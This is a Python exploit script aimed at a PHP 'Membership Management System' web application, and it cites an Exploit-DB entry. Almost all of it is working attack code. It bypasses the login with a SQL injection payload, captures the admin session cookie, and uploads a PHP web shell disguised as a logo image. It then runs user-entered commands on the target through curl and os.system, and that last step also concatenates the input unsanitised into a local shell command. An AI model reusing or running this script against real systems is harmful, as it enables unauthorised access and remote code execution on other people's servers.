from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests
import string
import random
import os

# reference : https://sospiro014.github.io/Membership-Management-System-RCE

# reference : https://www.exploit-db.com/exploits/50123

# generate random string 8 chars
def randomGen(size=8, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

# generating a random username and a random web shell file
shellFile = randomGen() + ".php"

# creating a payload for the login
payload = {
    "email": "test@mail.com' or 0=0 #",
    "password": "a",
    "login": ""
}

session = requests.Session()

# changeme
urlBase = "http://172.17.86.197/" # change this  target ip :)

# login
url = urlBase + "index.php"
print("=== executing SQL Injection ===")
req = session.post(url, payload, allow_redirects=False)

# check if 'Set-Cookie' header is present in the response
if 'Set-Cookie' in req.headers:
    cookie = req.headers["Set-Cookie"]
    print("=== authenticated admin cookie:" + cookie + " ===")
else:
    print("Set-Cookie header not found in the response.")
    exit()

# upload shell
url = urlBase + "settings.php"

# Get user input for the command to execute
cmd_input = input("Enter the command to execute: ")

# PHP code to execute the command received from the user
php_code = "<?php if(isset($_REQUEST['cmd'])){$cmd = ($_REQUEST['cmd']); system($cmd);die; }?>"

mp_encoder = MultipartEncoder(
    fields={
        "systemName": "Membership System",
        "currency": "$",
        "logo": (shellFile, php_code, "application/x-php"),
        "updateSettings": ""
    }
)

headers = {
    "Cookie": cookie,
    'Content-Type': mp_encoder.content_type
}

print("=== login user and uploading shell " + shellFile + " ===")
req = session.post(url, data=mp_encoder, allow_redirects=False, headers=headers)

# curl the shell for test
requestUrl = "curl " + urlBase + "uploads/" + shellFile + "?cmd=" + cmd_input
print("=== issuing the command: " + requestUrl + " ===")

print("=== CURL OUTPUT ===")
os.system(requestUrl)
